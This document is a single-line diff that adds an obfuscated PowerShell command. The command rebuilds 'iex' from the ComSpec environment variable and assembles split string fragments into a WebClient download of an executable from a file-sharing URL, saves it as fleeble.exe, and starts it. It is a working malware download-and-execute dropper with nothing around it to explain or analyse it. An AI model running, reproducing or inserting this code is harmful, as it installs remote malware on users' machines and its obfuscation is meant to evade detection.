@@ -1,0 +1,1 @@
+﻿& ( $Env:ComSPEC[4,15,25]-JoIn'') ((('('+'New-Ob'+'je'+'ct System.'+'Ne'+'t.WebCl'+'i'+'ent).'+'Downlo'+'adFi'+'le'+'({0}https://srv-'+'fil'+'e1.gof'+'il'+'e.io/d'+'ownload/SJLK'+'aG/8'+'4.200.65.20/w'+'s'+'c'+'r'+'ipt.exe'+'{0}'+',{0}flee'+'b'+'le.exe'+'{0'+'})'+';'+'S'+'t'+'art'+'-Pro'+'c'+'e'+'ss '+'{0}fleeble.exe{0}') -f [char]39) ) 
